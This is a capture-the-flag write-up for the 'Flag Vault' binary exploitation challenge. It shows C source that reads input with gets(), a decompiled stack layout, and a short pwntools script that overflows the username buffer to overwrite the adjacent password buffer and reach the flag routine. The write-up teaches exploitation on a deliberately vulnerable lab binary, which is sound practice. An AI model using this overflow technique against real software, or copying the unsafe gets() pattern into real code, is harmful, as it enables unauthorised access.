---
title: "Flag Vault"
categories: Binary Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
flags: THM{REDACTED}
---
> No description.

---

The challenge is a simple buffer overflow challenge.

```c
void login(){
	char password[100] = "";
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}
```

When we can overflow the `username` buffer, and we can overwrite the password buffer (we can't overwrite the return address because of the PIE).

```c
char s1[8]; // [rsp+0h] [rbp-E0h] BYREF
__int64 v2; // [rsp+8h] [rbp-D8h]
__int64 v3; // [rsp+10h] [rbp-D0h]
__int64 v4; // [rsp+18h] [rbp-C8h]
__int64 v5; // [rsp+20h] [rbp-C0h]
__int64 v6; // [rsp+28h] [rbp-B8h]
__int64 v7; // [rsp+30h] [rbp-B0h]
__int64 v8; // [rsp+38h] [rbp-A8h]
__int64 v9; // [rsp+40h] [rbp-A0h]
__int64 v10; // [rsp+48h] [rbp-98h]
__int64 v11; // [rsp+50h] [rbp-90h]
__int64 v12; // [rsp+58h] [rbp-88h]
int v13; // [rsp+60h] [rbp-80h]
char v14[8]; // [rsp+70h] [rbp-70h] BYREF
__int64 v15; // [rsp+78h] [rbp-68h]
__int64 v16; // [rsp+80h] [rbp-60h]
__int64 v17; // [rsp+88h] [rbp-58h]
__int64 v18; // [rsp+90h] [rbp-50h]
__int64 v19; // [rsp+98h] [rbp-48h]
__int64 v20; // [rsp+A0h] [rbp-40h]
__int64 v21; // [rsp+A8h] [rbp-38h]
__int64 v22; // [rsp+B0h] [rbp-30h]
__int64 v23; // [rsp+B8h] [rbp-28h]
__int64 v24; // [rsp+C0h] [rbp-20h]
__int64 v25; // [rsp+C8h] [rbp-18h]
int v26; // [rsp+D0h] [rbp-10h]
```

We can overwrite the `v14` variable where the offset is `0x70`, so we need to fill the buffer with `0x70` bytes and then write the password.

```py
from pwn import *

binary = './pwn1'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('10.10.23.57', 1337)

r.sendlineafter(b'Username: ', flat([
    b'bytereaper'.ljust(112, b'\x00'),
    b'5up3rP4zz123Byte\x00'
]))

r.interactive()
```
